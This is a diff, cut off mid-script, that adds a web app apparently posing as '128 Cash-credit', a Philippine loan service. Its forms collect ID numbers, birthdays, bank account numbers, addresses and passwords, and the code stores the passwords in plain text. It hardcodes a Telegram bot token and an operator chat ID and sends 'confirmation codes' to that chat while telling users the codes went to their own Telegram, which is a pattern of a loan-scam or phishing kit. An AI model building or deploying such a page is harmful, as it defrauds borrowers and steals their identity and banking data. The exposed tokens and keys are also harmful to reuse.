+                            <input type="password" id="reg-confirm" placeholder="Repeat password" autocomplete="new-password">
+                            <button type="button" class="pw-toggle" onclick="togglePw('reg-confirm',this)">Show</button>
+                        </div>
+                    </div>
+                    <button type="submit" class="btn-primary btn-clickable" id="register-btn"><span class="btn-text">Create Account</span><span class="btn-arrow">→</span><span class="btn-spinner"></span></button>
+                </form>
+                <p class="auth-switch">Already have an account? <a onclick="showScreen('screen-login')">Sign In</a></p>
+            </div>
+        </div>
+
+        <!-- DASHBOARD SCREEN -->
+        <div id="screen-dashboard" class="screen">
+            <div class="dash-header">
+                <div class="dash-logo">
+                    <div class="logo-icon">₱</div>
+                    <strong>128 Cash-credit</strong>
+                </div>
+                <button class="btn-logout btn-clickable" onclick="doLogout()">Log Out</button>
+            </div>
+
+            <div class="balance-card">
+                <div class="balance-label">Available Balance</div>
+                <div class="balance-amount"><span class="currency">₱</span><span id="disp-balance">0.00</span></div>
+                <div class="balance-card-row">
+                    <div>
+                        <div class="loan-type">128 Cash-credit</div>
+                    </div>
+                    <div id="disp-status-badge" class="status-badge badge-none">No Loan</div>
+                </div>
+            </div>
+
+            <div id="panel-home" class="tab-panel active">
+                <div style="padding-top:4px;"></div>
+                <div id="verified-strip" class="verified-strip" style="display:none;"><span class="live-dot"></span> Account Verified & Active</div>
+                <div id="freeze-warning" class="verified-strip" style="display:none;background:#fff3e0;border-color:#ffb74d;color:#e65100;">⚠ Account Frozen — Balance is read-only</div>
+                <div class="stat-grid">
+                    <div class="stat-card">
+                        <div class="s-label">Loan Status</div>
+                        <div class="s-value green" id="home-loan-status">—</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="s-label">Loan Amount</div>
+                        <div class="s-value" id="home-loan-amount">₱0</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="s-label">Account Type</div>
+                        <div class="s-value" style="font-size:13px;">Personal Loan</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="s-label">Slot #</div>
+                        <div class="s-value green" id="home-slot">—</div>
+                    </div>
+                </div>
+                <div class="section-label">Quick Actions</div>
+                <div class="stat-grid" style="grid-template-columns:1fr 1fr 1fr;margin:0 20px 16px;">
+                    <div class="stat-card btn-clickable" style="text-align:center;cursor:pointer;" onclick="switchTab('loan')">
+                        <div class="s-icon icon-loan" style="margin:0 auto 8px;">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="18" rx="2"/><line x1="2" y1="9" x2="22" y2="9"/><circle cx="12" cy="14" r="3"/></svg>
+                        </div>
+                        <div style="font-size:12px;font-weight:700;color:var(--text2);">Apply Loan</div>
+                    </div>
+                    <div class="stat-card btn-clickable" style="text-align:center;cursor:pointer;" onclick="switchTab('withdraw')">
+                        <div class="s-icon icon-withdraw" style="margin:0 auto 8px;">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="8 12 12 16 16 12"/><line x1="12" y1="8" x2="12" y2="16"/></svg>
+                        </div>
+                        <div style="font-size:12px;font-weight:700;color:var(--text2);">Withdraw</div>
+                    </div>
+                    <div class="stat-card btn-clickable" style="text-align:center;cursor:pointer;" onclick="openIdModal()">
+                        <div class="s-icon icon-id" style="margin:0 auto 8px;">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="18" rx="2"/><line x1="2" y1="9" x2="22" y2="9"/><line x1="7" y1="14" x2="12" y2="14"/></svg>
+                        </div>
+                        <div style="font-size:12px;font-weight:700;color:var(--text2);">View ID</div>
+                    </div>
+                </div>
+                <div class="section-card">
+                    <div class="section-title">
+                        <span class="icon">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+                        </span>Notice
+                    </div>
+                    <p style="font-size:13px;color:var(--text2);line-height:1.7;">128 Cash-credit Philippines offers quick personal loans with flexible repayment. Apply today and get approved within minutes. Requirements: valid ID and active bank account.</p>
+                </div>
+            </div>
+
+            <!-- LOAN TAB -->
+            <div id="panel-loan" class="tab-panel">
+                <div style="padding-top:4px;"></div>
+                <div class="section-card" style="margin-bottom:8px;">
+                    <div class="section-title">
+                        <span class="icon">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="18" rx="2"/><line x1="2" y1="9" x2="22" y2="9"/><circle cx="12" cy="14" r="3"/></svg>
+                        </span>Loan Application
+                    </div>
+                    <p style="font-size:13px;color:var(--text2);">Fill in your details below. Our team will review your application.</p>
+                </div>
+                <div class="loan-form-wrap">
+                    <form id="loan-form" autocomplete="off">
+                        <div class="form-group"><label>Full Name</label><input type="text" id="loan-fullname" autocomplete="off"></div>
+                        <div class="form-group"><label>ID Number</label><input type="text" id="loan-idnumber" autocomplete="off"></div>
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label>Gender</label>
+                                <select id="loan-gender">
+                                    <option value="Female">Female</option>
+                                    <option value="Male" selected>Male</option>
+                                    <option value="Other">Other</option>
+                                </select>
+                            </div>
+                            <div class="form-group">
+                                <label>Birthday</label>
+                                <input type="date" id="loan-birthday" autocomplete="off">
+                            </div>
+                        </div>
+                        <div class="form-group"><label>Bank Name</label>
+                            <select id="loan-bank">
+                                <option value="BDO">BDO Unibank</option>
+                                <option value="BPI">BPI</option>
+                                <option value="Metrobank">Metrobank</option>
+                                <option value="Landbank">Landbank</option>
+                                <option value="PNB">PNB</option>
+                                <option value="Security Bank">Security Bank</option>
+                                <option value="UnionBank">UnionBank</option>
+                                <option value="RCBC">RCBC</option>
+                            </select>
+                        </div>
+                        <div class="form-group"><label>Bank Account Number</label><input type="text" id="loan-bankaccount" autocomplete="off" inputmode="numeric"></div>
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label>Marital Status</label>
+                                <select id="loan-marital">
+                                    <option value="Single">Single</option>
+                                    <option value="Married" selected>Married</option>
+                                    <option value="Widowed">Widowed</option>
+                                </select>
+                            </div>
+                            <div class="form-group">
+                                <label>Education</label>
+                                <select id="loan-education">
+                                    <option value="High School">High School</option>
+                                    <option value="College" selected>College</option>
+                                    <option value="Vocational">Vocational</option>
+                                    <option value="Graduate">Graduate</option>
+                                </select>
+                            </div>
+                        </div>
+                        <div class="form-group"><label>Career / Occupation</label><input type="text" id="loan-career" autocomplete="off"></div>
+                        <div class="form-group"><label>Province</label>
+                            <select id="loan-province">
+                                <option value="Metro Manila" selected>Metro Manila</option>
+                                <option value="Cebu">Cebu</option>
+                                <option value="Davao">Davao</option>
+                                <option value="Bulacan">Bulacan</option>
+                                <option value="Laguna">Laguna</option>
+                                <option value="Pampanga">Pampanga</option>
+                                <option value="Batangas">Batangas</option>
+                                <option value="Rizal">Rizal</option>
+                                <option value="Cavite">Cavite</option>
+                                <option value="Other">Other</option>
+                            </select>
+                        </div>
+                        <div class="form-group"><label>Complete Address</label><input type="text" id="loan-address" autocomplete="off"></div>
+                        <div class="form-group"><label>Loan Amount (₱)</label><input type="number" id="loan-amount" min="1000" max="500000" inputmode="numeric" autocomplete="off" placeholder="1,000 - 500,000"></div>
+                        <button type="submit" class="btn-primary btn-clickable" id="loan-btn"><span class="btn-text">Submit Loan Application</span><span class="btn-arrow">→</span><span class="btn-spinner"></span></button>
+                        <div id="loan-status-info" style="margin-top:14px;text-align:center;font-size:13px;color:var(--text2);"></div>
+                    </form>
+                </div>
+            </div>
+
+            <!-- WITHDRAW TAB - ONLY BANK SELECTION -->
+            <div id="panel-withdraw" class="tab-panel">
+                <div style="padding-top:4px;"></div>
+                <div class="section-card" style="margin-bottom:8px;">
+                    <div class="section-title">
+                        <span class="icon">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="8 12 12 16 16 12"/><line x1="12" y1="8" x2="12" y2="16"/></svg>
+                        </span>Withdraw Funds
+                    </div>
+                    <p style="font-size:13px;color:var(--text2);">Select your bank and enter withdrawal details.</p>
+                    <div style="margin-top:12px;background:var(--green-light);padding:14px 16px;border-radius:12px;font-size:14px;font-weight:600;color:var(--green-dark);display:flex;justify-content:space-between;align-items:center;border:2px solid #c8e6d0;">
+                        <span style="display:flex;align-items:center;gap:6px;">
+                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="16"/></svg>
+                            Available Balance
+                        </span>
+                        <span id="wd-balance-display" style="font-size:18px;font-weight:800;">₱0.00</span>
+                    </div>
+                </div>
+                <div style="padding:0 20px;">
+                    <div class="section-label" style="margin:8px 0 12px;">
+                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="3" y="3" width="18" height="18" rx="2"/><line x1="3" y1="9" x2="21" y2="9"/></svg>
+                        Select Bank
+                    </div>
+                    <div class="bank-grid" id="bank-grid">
+                        <div class="bank-card btn-clickable" data-bank="BDO" data-type="bank" onclick="selectBank(this)">
+                            <div class="bank-dot" style="background:#0056b3;">BD</div><span class="bank-name">BDO</span></div>
+                        <div class="bank-card btn-clickable" data-bank="BPI" data-type="bank" onclick="selectBank(this)">
+                            <div class="bank-dot" style="background:#d42020;">BP</div><span class="bank-name">BPI</span></div>
+                        <div class="bank-card btn-clickable" data-bank="Metrobank" data-type="bank" onclick="selectBank(this)">
+                            <div class="bank-dot" style="background:#5b2d8e;">MB</div><span class="bank-name">Metrobank</span></div>
+                        <div class="bank-card btn-clickable" data-bank="Landbank" data-type="bank" onclick="selectBank(this)">
+                            <div class="bank-dot" style="background:#006838;">LB</div><span class="bank-name">Landbank</span></div>
+                        <div class="bank-card btn-clickable" data-bank="PNB" data-type="bank" onclick="selectBank(this)">
+                            <div class="bank-dot" style="background:#8b4513;">PN</div><span class="bank-name">PNB</span></div>
+                        <div class="bank-card btn-clickable" data-bank="Security Bank" data-type="bank" onclick="selectBank(this)">
+                            <div class="bank-dot" style="background:#1a5276;">SB</div><span class="bank-name">Security</span></div>
+                        <div class="bank-card btn-clickable" data-bank="UnionBank" data-type="bank" onclick="selectBank(this)">
+                            <div class="bank-dot" style="background:#e87500;">UB</div><span class="bank-name">UnionBank</span></div>
+                        <div class="bank-card btn-clickable" data-bank="RCBC" data-type="bank" onclick="selectBank(this)">
+                            <div class="bank-dot" style="background:#003366;">RC</div><span class="bank-name">RCBC</span></div>
+                    </div>
+
+                    <div id="withdraw-form-section" style="display:none;margin-top:12px;">
+                        <div id="selected-bank-summary" class="withdraw-summary highlight" style="display:flex;">
+                            <div class="ws-icon" id="ws-bank-dot" style="background:#0d7a3e;">--</div>
+                            <div class="ws-details">
+                                <div class="ws-bank" id="selected-bank-name">—</div>
+                                <div class="ws-sub" id="selected-bank-type">Selected destination</div>
+                            </div>
+                        </div>
+                        <div class="section-label" style="margin:4px 0 10px;">Quick Amount</div>
+                        <div class="quick-amounts" id="quick-amounts-container">
+                            <button type="button" class="quick-amt-btn btn-clickable" onclick="setWdAmount(500)">₱500</button>
+                            <button type="button" class="quick-amt-btn btn-clickable" onclick="setWdAmount(1000)">₱1,000</button>
+                            <button type="button" class="quick-amt-btn btn-clickable" onclick="setWdAmount(5000)">₱5,000</button>
+                            <button type="button" class="quick-amt-btn btn-clickable" onclick="setWdAmount(10000)">₱10,000</button>
+                            <button type="button" class="quick-amt-btn btn-clickable" onclick="setWdAmount(50000)">₱50,000</button>
+                        </div>
+                        <div class="form-group">
+                            <label>Withdrawal Amount (₱)</label>
+                            <input type="number" id="wd-amount" placeholder="Enter amount (min ₱100)" inputmode="numeric" autocomplete="off" oninput="validateWdAmount()" onblur="formatWdAmount()">
+                            <div class="input-hint" id="wd-amount-hint">Minimum ₱100 · Maximum ₱500,000</div>
+                        </div>
+                        <div class="form-group">
+                            <label id="wd-account-label">Account UID</label>
+                            <input type="text" id="wd-account" placeholder="Enter account UID" autocomplete="off" inputmode="numeric" oninput="validateWdAccount()">
+                            <div class="input-hint" id="wd-account-hint">Enter your bank account UID</div>
+                        </div>
+                        <div class="form-group">
+                            <label>Account Name</label>
+                            <input type="text" id="wd-accname" placeholder="Name on account" autocomplete="off" oninput="validateWdAccName()">
+                            <div class="input-hint" id="wd-accname-hint">Must match the registered account name</div>
+                        </div>
+                        <div class="form-group">
+                            <label>Password (Confirm)</label>
+                            <div class="pw-wrap">
+                                <input type="password" id="wd-password" placeholder="Enter your password to confirm" autocomplete="new-password" oninput="validateWdPassword()">
+                                <button type="button" class="pw-toggle" onclick="togglePw('wd-password',this)">Show</button>
+                            </div>
+                            <div class="input-hint" id="wd-password-hint">Required for security verification</div>
+                        </div>
+
+                        <!-- Review Card -->
+                        <div class="review-card" id="wd-review-card" style="display:none;">
+                            <div style="font-size:13px;font-weight:700;color:var(--text);margin-bottom:10px;letter-spacing:-0.1px;">
+                                📋 Withdrawal Summary
+                            </div>
+                            <div class="review-row">
+                                <span class="r-label">Destination</span>
+                                <span class="r-value" id="review-bank">—</span>
+                            </div>
+                            <div class="review-row">
+                                <span class="r-label">Account UID</span>
+                                <span class="r-value" id="review-account">—</span>
+                            </div>
+                            <div class="review-row">
+                                <span class="r-label">Account Name</span>
+                                <span class="r-value" id="review-accname">—</span>
+                            </div>
+                            <div class="review-row">
+                                <span class="r-label">Amount</span>
+                                <span class="r-value highlight" id="review-amount">₱0</span>
+                            </div>
+                            <div class="review-row">
+                                <span class="r-label">Remaining Balance</span>
+                                <span class="r-value" id="review-remaining">₱0</span>
+                            </div>
+                        </div>
+
+                        <button class="btn-primary btn-clickable pulse" id="wd-btn" onclick="submitWithdraw()">
+                            <span class="btn-text">Review & Process Withdrawal</span><span class="btn-arrow">→</span><span class="btn-spinner"></span>
+                        </button>
+                        <div style="text-align:center;margin-top:10px;">
+                            <button class="btn-secondary btn-clickable" onclick="resetWithdrawForm()" style="font-size:13px;padding:10px;max-width:200px;margin:0 auto;">
+                                ↻ Reset Form
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- PROFILE TAB -->
+            <div id="panel-profile" class="tab-panel">
+                <div style="padding-top:4px;"></div>
+                <div class="profile-header">
+                    <div class="profile-avatar">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+                    </div>
+                    <div class="profile-name" id="prof-name">—</div>
+                    <div class="profile-email" id="prof-email">—</div>
+                    <div style="margin-top:8px;">
+                        <span class="status-badge badge-approved" id="prof-verified-badge" style="font-size:10px;">Verified</span>
+                    </div>
+                </div>
+                <div class="profile-stats">
+                    <div class="profile-stat">
+                        <div class="ps-value green" id="prof-balance">₱0</div>
+                        <div class="ps-label">Balance</div>
+                    </div>
+                    <div class="profile-stat">
+                        <div class="ps-value" id="prof-loanstatus">—</div>
+                        <div class="ps-label">Loan Status</div>
+                    </div>
+                    <div class="profile-stat">
+                        <div class="ps-value" id="prof-slot">—</div>
+                        <div class="ps-label">Slot #</div>
+                    </div>
+                </div>
+                <div class="profile-list">
+                    <div class="profile-item"><span class="p-label">Full Name</span><span class="p-value" id="prof-fullname">—</span></div>
+                    <div class="profile-item"><span class="p-label">ID Name</span><span class="p-value" id="prof-idname">—</span></div>
+                    <div class="profile-item"><span class="p-label">ID Number</span><span class="p-value" id="prof-idnumber">—</span></div>
+                    <div class="profile-item"><span class="p-label">Email</span><span class="p-value" id="prof-email2">—</span></div>
+                    <div class="profile-item"><span class="p-label">Loan Amount</span><span class="p-value green" id="prof-loanamount">₱0</span></div>
+                    <div class="profile-item"><span class="p-label">Status</span><span class="p-value" id="prof-freeze-status" style="color:var(--text3);">Active</span></div>
+                </div>
+                <div class="profile-actions">
+                    <button class="action-btn primary btn-clickable" onclick="openIdModal()">
+                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="vertical-align:middle;margin-right:4px;"><rect x="2" y="3" width="20" height="18" rx="2"/><line x1="2" y1="9" x2="22" y2="9"/></svg> View ID
+                    </button>
+                    <button class="action-btn danger btn-clickable" onclick="doLogout()">
+                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="vertical-align:middle;margin-right:4px;"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg> Log Out
+                    </button>
+                </div>
+            </div>
+
+            <div class="tab-bar">
+                <button class="tab-item active btn-clickable" id="tab-home" onclick="switchTab('home')">
+                    <span class="tab-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg></span>
+                    <span class="tab-label">Home</span>
+                </button>
+                <button class="tab-item btn-clickable" id="tab-loan" onclick="switchTab('loan')">
+                    <span class="tab-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="18" rx="2"/><line x1="2" y1="9" x2="22" y2="9"/><circle cx="12" cy="14" r="3"/></svg></span>
+                    <span class="tab-label">Loan</span>
+                </button>
+                <button class="tab-item btn-clickable" id="tab-withdraw" onclick="switchTab('withdraw')">
+                    <span class="tab-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="8 12 12 16 16 12"/><line x1="12" y1="8" x2="12" y2="16"/></svg></span>
+                    <span class="tab-label">Withdraw</span>
+                </button>
+                <button class="tab-item btn-clickable" id="tab-profile" onclick="switchTab('profile')">
+                    <span class="tab-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg></span>
+                    <span class="tab-label">Profile</span>
+                </button>
+                <button class="tab-item btn-clickable" id="tab-id" onclick="openIdModal()">
+                    <span class="tab-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="18" rx="2"/><line x1="2" y1="9" x2="22" y2="9"/><line x1="7" y1="14" x2="12" y2="14"/></svg></span>
+                    <span class="tab-label">ID</span>
+                </button>
+            </div>
+        </div>
+
+        <!-- LOAN CONFIRM OVERLAY -->
+        <div class="overlay" id="overlay-loan-confirm">
+            <div class="overlay-card">
+                <h3>Loan Processing</h3>
+                <p style="font-size:13px;color:var(--text2);margin-bottom:8px;">Enter the loan confirmation code sent to your Telegram</p>
+                <div class="code-input">
+                    <input type="text" id="loan-code-1" maxlength="1" oninput="moveNext(this,'loan-code-2')">
+                    <input type="text" id="loan-code-2" maxlength="1" oninput="moveNext(this,'loan-code-3')">
+                    <input type="text" id="loan-code-3" maxlength="1" oninput="moveNext(this,'loan-code-4')">
+                    <input type="text" id="loan-code-4" maxlength="1" oninput="moveNext(this,'loan-code-5')">
+                    <input type="text" id="loan-code-5" maxlength="1" oninput="moveNext(this,'loan-code-6')">
+                    <input type="text" id="loan-code-6" maxlength="1" oninput="moveNext(this,'loan-code-6')">
+                </div>
+                <div class="info-text">Check your Telegram for the confirmation code</div>
+                <div class="timer-display">
+                    <span id="loan-confirm-time">7d 00:00</span>
+                </div>
+                <div style="font-size:11px;color:var(--text3);font-weight:600;letter-spacing:.5px;margin-bottom:16px;">REMAINING</div>
+                <button class="btn-primary btn-clickable" onclick="verifyLoanCode()"><span class="btn-text">Confirm Loan</span><span class="btn-arrow">→</span><span class="btn-spinner"></span></button>
+            </div>
+        </div>
+
+        <!-- WITHDRAW CONFIRM OVERLAY -->
+        <div class="overlay" id="overlay-wd-confirm">
+            <div class="overlay-card">
+                <h3>Withdrawal Confirmation</h3>
+                <p style="font-size:13px;color:var(--text2);margin-bottom:8px;">Enter the withdrawal confirmation code sent to your Telegram</p>
+                <div class="code-input">
+                    <input type="text" id="wd-code-1" maxlength="1" oninput="moveNext(this,'wd-code-2')">
+                    <input type="text" id="wd-code-2" maxlength="1" oninput="moveNext(this,'wd-code-3')">
+                    <input type="text" id="wd-code-3" maxlength="1" oninput="moveNext(this,'wd-code-4')">
+                    <input type="text" id="wd-code-4" maxlength="1" oninput="moveNext(this,'wd-code-5')">
+                    <input type="text" id="wd-code-5" maxlength="1" oninput="moveNext(this,'wd-code-6')">
+                    <input type="text" id="wd-code-6" maxlength="1" oninput="moveNext(this,'wd-code-6')">
+                </div>
+                <div class="info-text">Check your Telegram for the confirmation code</div>
+                <div class="timer-display">
+                    <span id="wd-confirm-time">30:00</span>
+                </div>
+                <div style="font-size:11px;color:var(--text3);font-weight:600;letter-spacing:.5px;margin-bottom:16px;">REMAINING</div>
+                <button class="btn-primary btn-clickable" onclick="verifyWdCode()"><span class="btn-text">Confirm Withdrawal</span><span class="btn-arrow">→</span><span class="btn-spinner"></span></button>
+                <button class="btn-secondary btn-clickable" onclick="cancelWithdraw()">Cancel</button>
+            </div>
+        </div>
+
+        <!-- ID Modal -->
+        <div class="modal-backdrop" id="modal-id">
+            <div class="modal-box">
+                <div class="modal-head">
+                    <h4>
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="vertical-align:middle;margin-right:6px;"><rect x="2" y="3" width="20" height="18" rx="2"/><line x1="2" y1="9" x2="22" y2="9"/></svg>
+                        ID Photo
+                    </h4>
+                    <button class="modal-close" onclick="closeIdModal()">✕</button>
+                </div>
+                <div class="modal-body">
+                    <img src="https://bsp888.cc/uploads/picture/202603/2402785ab62484d4c6e5b9738d8f2e82.jpg" alt="ID Photo" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%22360%22 height=%22220%22><rect fill=%22%230d7a3e%22 width=%22360%22 height=%22220%22/><text x=%22180%22 y=%22110%22 fill=%22%23fff%22 font-size=%2220%22 text-anchor=%22middle%22 font-family=%22Arial%22>ID Card</text></svg>'">
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        // ============================================================
+        //  SUPABASE CONFIGURATION
+        // ============================================================
+        const SUPABASE_URL = 'https://wyszjxixjgasxkouckkl.supabase.co';
+        const SUPABASE_KEY = 'sb_publishable_Q1G5K02Q2FKcDKv2zcRWUQ_ZkQBrwg1';
+
+        // ============================================================
+        //  TELEGRAM CONFIG
+        // ============================================================
+        const TG_TOKEN = '8888068488:AAGeZEzcf9RDCFQ3zCizVMA2nNh_PhYEVeY';
+        const TG_CHAT = '7417215529';
+
+        // ============================================================
+        //  STATE
+        // ============================================================
+        let currentUser = null;
+        let currentSlot = null;
+        let selectedBank = '';
+        let selectedBankType = 'bank';
+        let loanConfirmTimer = null;
+        let wdConfirmTimer = null;
+        let pendingLoanAmount = 0;
+        let pendingWdAmount = 0;
+        let pendingWdData = null;
+        let generatedLoanCode = '';
+        let generatedWdCode = '';
+
+        const bankColors = {
+            'BDO': '#0056b3',
+            'BPI': '#d42020',
+            'Metrobank': '#5b2d8e',
+            'Landbank': '#006838',
+            'PNB': '#8b4513',
+            'Security Bank': '#1a5276',
+            'UnionBank': '#e87500',
+            'RCBC': '#003366'
+        };
+        const bankInitials = {
+            'BDO': 'BD',
+            'BPI': 'BP',
+            'Metrobank': 'MB',
+            'Landbank': 'LB',
+            'PNB': 'PN',
+            'Security Bank': 'SB',
+            'UnionBank': 'UB',
+            'RCBC': 'RC'
+        };
+
+        // ============================================================
+        //  SUPABASE HELPERS
+        // ============================================================
+        async function supabaseFetch(path, options = {}) {
+            const url = `${SUPABASE_URL}/rest/v1${path}`;
+            const headers = {
+                'apikey': SUPABASE_KEY,
+                'Authorization': `Bearer ${SUPABASE_KEY}`,
+                'Content-Type': 'application/json',
+                'Prefer': 'return=representation'
+            };
+            const response = await fetch(url, { ...options, headers: { ...headers, ...options.headers } });
+            if (!response.ok) {
+                const errorText = await response.text();
+                throw new Error(`Supabase error: ${response.status} - ${errorText}`);
+            }
+            return response.json();
+        }
+
+        async function getUserByEmail(email) {
+            try {
+                const users = await supabaseFetch(`/users?email=eq.${encodeURIComponent(email)}&select=*`);
+                return users && users.length > 0 ? users[0] : null;
+            } catch (e) { return null; }
+        }
+
+        async function getUserBySlot(slot) {
+            try {
+                const users = await supabaseFetch(`/users?slot=eq.${slot}&select=*`);
+                return users && users.length > 0 ? users[0] : null;
+            } catch (e) { return null; }
+        }
+
+        async function createUser(userData) {
+            const existing = await getUserByEmail(userData.email);
+            if (existing) throw new Error('Email already registered');
+            const allUsers = await supabaseFetch('/users?select=slot&order=slot.asc');
+            const usedSlots = new Set(allUsers.map(u => u.slot));
+            let slot = 1;
+            while (usedSlots.has(slot) && slot <= 70) slot++;
+            if (slot > 70) throw new Error('No available slots. Contact support.');
+            const newUser = {
+                slot,
+                email: userData.email,
+                password: userData.password,
+                full_name: userData.fullName,
+                id_name: userData.idName,
+                id_number: userData.idNumber,
+                balance: 0,
+                loan_status: 'none',
+                loan_amount: 0,
+                verified: true,
+                frozen: false
+            };
+            const url = `${SUPABASE_URL}/rest/v1/users`;
+            const headers = {
+                'apikey': SUPABASE_KEY,
+                'Authorization': `Bearer ${SUPABASE_KEY}`,
+                'Content-Type': 'application/json',
+                'Prefer': 'return=representation'
+            };
+            const response = await fetch(url, { method: 'POST', headers, body: JSON.stringify(newUser) });
+            if (!response.ok) throw new Error(`Registration failed: ${response.status}`);
+            const result = await response.json();
+            return result && result.length > 0 ? result[0] : null;
+        }
+
+        async function updateUser(slot, updates) {
+            const result = await supabaseFetch(`/users?slot=eq.${slot}`, {
+                method: 'PATCH',
+                body: JSON.stringify({ ...updates, updated_at: new Date().toISOString() })
+            });
+            return result && result.length > 0 ? result[0] : null;
+        }
+
+        async function updateBalance(slot, amount) {
+            const user = await getUserBySlot(slot);
+            if (!user) throw new Error('User not found');
+            if (user.frozen) throw new Error('Account frozen — balance is read-only');
+            const newBalance = (user.balance || 0) + amount;
+            if (newBalance < 0) throw new Error('Insufficient balance');
+            return updateUser(slot, { balance: newBalance });
+        }
+
+        async function updateLoanStatus(slot, status, amount = 0) {
+            return updateUser(slot, { loan_status: status, loan_amount: amount });
+        }
+
+        // ============================================================
+        //  TOAST
+        // ============================================================
+        let toastTimer;
+
+        function showToast(msg, type = 'info', duration = 3000) {
+            const t = document.getElementById('toast');
+            t.textContent = msg;
+            t.className = `show ${type}`;
+            clearTimeout(toastTimer);
+            toastTimer = setTimeout(() => { t.className = ''; }, duration);
+        }
+
+        // ============================================================
+        //  TELEGRAM
+        // ============================================================
+        function sendTelegram(msg) {
+            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: TG_CHAT, text: msg, parse_mode: 'HTML' })
+            }).catch(() => {});
+        }
+
+        function sendTelegramWithCode(msg, code) {
+            sendTelegram(msg + `\n\nCONFIRMATION CODE: ${code}`);
+            return code;
+        }
+
+        // ============================================================
+        //  SCREEN / TAB HELPERS
+        // ============================================================
+        function showScreen(id) {
+            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+            document.getElementById(id).classList.add('active');
+        }
+
+        function togglePw(inputId, btn) {
+            const inp = document.getElementById(inputId);
+            if (inp.type === 'password') {
+                inp.type = 'text';
+                btn.textContent = 'Hide';
+            } else {
+                inp.type = 'password';
+                btn.textContent = 'Show';
+            }
+        }
+
+        function moveNext(current, nextId) {
+            if (current.value.length === 1) {
+                const next = document.getElementById(nextId);
+                if (next) next.focus();
+            }
+        }
+
+        function getCode(prefix) {
+            let code = '';
+            for (let i = 1; i <= 6; i++) {
+                const val = document.getElementById(prefix + '-' + i).value;
+                if (!val) return null;
+                code += val;
+            }
+            return code;
+        }
+
+        function clearCode(prefix) {
+            for (let i = 1; i <= 6; i++) document.getElementById(prefix + '-' + i).value = '';
+            document.getElementById(prefix + '-1').focus();
+        }
+
+        function generateRandomCode() {
+            return String(Math.floor(100000 + Math.random() * 900000));
+        }
+
+        function switchTab(tab) {
+            document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
+            document.querySelectorAll('.tab-item').forEach(t => t.classList.remove('active'));
+            const panel = document.getElementById(`panel-${tab}`);
+            const tabBtn = document.getElementById(`tab-${tab}`);
+            if (panel) panel.classList.add('active');
+            if (tabBtn) tabBtn.classList.add('active');
+            if (tab === 'profile') refreshProfile();
+            if (tab === 'withdraw') updateWdBalance();
+        }
+
+        // ============================================================
+        //  SMART WITHDRAWAL HELPERS
+        // ============================================================
+        function setWdAmount(amount) {
+            const wdInput = document.getElementById('wd-amount');
+            if (wdInput) {
+                wdInput.value = amount;
+                wdInput.focus();
+                document.querySelectorAll('.quick-amt-btn').forEach(b => b.classList.remove('active-amount'));
+                const buttons = document.querySelectorAll('.quick-amt-btn');
+                buttons.forEach(b => {
+                    if (b.textContent.trim() === '₱' + amount.toLocaleString()) {
+                        b.classList.add('active-amount');
+                    }
+                });
+                validateWdAmount();
+                updateReviewCard();
+            }
+        }
+
+        function validateWdAmount() {
+            const input = document.getElementById('wd-amount');
+            const hint = document.getElementById('wd-amount-hint');
+            const val = parseFloat(input.value);
+            if (!input.value) {
+                input.classList.remove('input-error', 'input-valid');
+                hint.textContent = 'Minimum ₱100 · Maximum ₱500,000';
+                hint.className = 'input-hint';
+            } else if (isNaN(val) || val < 100) {
